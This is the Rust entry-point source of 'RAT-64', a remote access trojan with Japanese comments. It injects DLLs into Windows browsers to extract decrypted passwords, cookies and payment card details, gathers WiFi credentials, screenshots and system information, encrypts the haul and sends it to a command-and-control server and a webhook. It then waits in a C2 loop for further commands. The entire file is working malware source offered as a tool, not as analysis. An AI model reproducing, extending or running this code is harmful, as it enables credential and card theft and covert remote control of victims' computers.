// RAT-64 - 統合システム情報収集ツール
use rmp_serde::encode::to_vec as to_msgpack_vec;
use rand::RngCore;
use rat_64::{
    encrypt_data_with_key, load_config_or_default, IntegratedPayload, 
    send_unified_webhook, execute_rat_operations, C2Client
};

#[cfg(windows)]
use rat_64::services::{BrowserInjector, BrowserData};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🦀 RAT-64 起動中...");
    
    let config = load_config_or_default();
    println!("✅ 設定読み込み完了");
    
    if let Err(e) = rat_64::core::config::validate_config(&config) {
        println!("❌ 設定エラー: {}", e);
        return Ok(());
    }

    let mut c2_client = C2Client::new(config.clone());
    
    // ブラウザDLL注入（Windows環境のみ）
    let dll_browser_data = collect_browser_data_via_dll().await;
    
    // データ収集とC2処理
    println!("🔍 データ収集開始...");
    if let Err(e) = perform_main_data_collection(&config, &mut c2_client, dll_browser_data.as_ref()).await {
        eprintln!("❌ データ収集エラー: {}", e);
        return Ok(());
    }
    
    if config.command_server_enabled {
        println!("🎯 C2待機モードに移行");
        if let Err(e) = c2_client.start_c2_loop().await {
            eprintln!("❌ C2エラー: {}", e);
        }
    } else {
        println!("🎯 実行完了");
    }
    
    Ok(())
}

/// ブラウザDLL注入でデータ収集（Windows専用）
#[cfg(windows)]
async fn collect_browser_data_via_dll() -> Option<BrowserData> {
    println!("🌐 ブラウザDLL注入処理開始...");
    
    match BrowserInjector::new() {
        Ok(injector) => match injector.inject_all_browsers().await {
            Ok(data) => {
                println!("✅ ブラウザDLL注入処理完了");
                Some(data)
            }
            Err(e) => {
                println!("❌ DLL注入エラー: {}", e);
                None
            }
        },
        Err(e) => {
            println!("❌ インジェクタ初期化エラー: {}", e);
            None
        }
    }
}

#[cfg(not(windows))]
async fn collect_browser_data_via_dll() -> Option<()> {
    None
}

/// DLL注入で収集したブラウザデータをメインペイロードに統合
#[cfg(windows)]
fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &BrowserData) {
    println!("🔗 DLL注入データ統合中...");
    
    // パスワード統合
    for password in &dll_data.passwords {
        payload.auth_data.passwords.push(format!(
            "[DLL_DECRYPTED] {}|{}|{}", 
            password.origin, password.username, password.password
        ));
    }
    
    // クッキー統合
    for cookie in &dll_data.cookies {
        payload.auth_data.passwords.push(format!(
            "[DLL_COOKIE] {}|{}|{}", 
            cookie.host, cookie.name, cookie.value
        ));
    }
    
    // 支払い情報統合
    for payment in &dll_data.payments {
        payload.auth_data.passwords.push(format!(
            "[DLL_PAYMENT] {}|{}|{}|{}", 
            payment.card_number, payment.name_on_card, 
            payment.expiration_month, payment.expiration_year
        ));
    }
    
    let total = dll_data.passwords.len() + dll_data.cookies.len() + dll_data.payments.len();
    println!("   ✅ DLL統合: {}件 (パスワード:{}, クッキー:{}, 支払い:{})", 
        total, dll_data.passwords.len(), dll_data.cookies.len(), dll_data.payments.len());
}

/// メインのデータ収集処理
async fn perform_main_data_collection(
    config: &rat_64::Config, 
    c2_client: &mut C2Client,
    #[cfg(windows)] dll_browser_data: Option<&rat_64::services::BrowserData>,
    #[cfg(not(windows))] _dll_browser_data: Option<&()>,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut payload = IntegratedPayload::create_with_config(&config).await?;
    // 収集データの統合
    
    // DLL注入データ統合
    #[cfg(windows)]
    if let Some(dll_data) = dll_browser_data {
        integrate_dll_browser_data(&mut payload, dll_data);
    }
    
    let final_count = payload.auth_data.passwords.len();
    println!("✅ データ収集完了: システム:{}, 認証:{}件, WiFi:{}件, スクリーン:{}件",
        payload.system_info.hostname,
        final_count,
        payload.auth_data.wifi_creds.len(),
        payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0)
    );
    
    // データ暗号化・保存・送信
    process_and_save_data(payload, config, c2_client).await?;
    
    // 実行結果サマリー
    println!("� 実行結果サマリー:");
    match execute_rat_operations(&config).await {
        Ok(summary) => println!("{}", summary),
        Err(e) => println!("❌ サマリー生成エラー: {}", e),
    }
    
    println!("🎯 RAT-64 メイン処理完了！");
    Ok(())
}

/// データの暗号化・保存・送信処理
async fn process_and_save_data(
    mut payload: rat_64::IntegratedPayload, 
    config: &rat_64::Config, 
    c2_client: &mut C2Client
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔒 データ暗号化中...");
    
    let serialized = to_msgpack_vec(&payload)?;
    let (encrypted, key, nonce) = encrypt_with_random_key(&serialized)?;
    payload.set_encryption_info(&key, &nonce);
    
    println!("✅ データ暗号化完了 ({}バイト)", encrypted.len());
    
    // C2アップロード
    if config.command_server_enabled {
        match c2_client.upload_collected_data(&payload).await {
            Ok(()) => println!("✅ データサーバーアップロード成功"),
            Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
        }
    }
    
    // ファイル保存
    std::fs::write("data.dat", &encrypted)?;
    println!("💾 暗号化データをdata.datに保存完了");
    
    // Webhook送信
    if config.webhook_enabled {
        println!("📡 Webhook送信中...");
        match send_unified_webhook(&payload, &config).await {
            Ok(()) => println!("✅ Webhook送信成功"),
            Err(e) => println!("❌ Webhook送信失敗: {}", e),
        }
    }
    
    Ok(())
}

// ランダムキーでの暗号化ヘルパー（キーとノンスも返す）
fn encrypt_with_random_key(data: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 12]), rat_64::RatError> {
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    
    rand::rng().fill_bytes(&mut key);
    rand::rng().fill_bytes(&mut nonce);
    
    let encrypted = encrypt_data_with_key(data, &key, &nonce)?;
    Ok((encrypted, key, nonce))
}

// 非Windows環境用のダミー実装
#[cfg(not(windows))]
fn is_admin() -> bool {
    false // Unix系では簡単にはチェックできないため false を返す
}
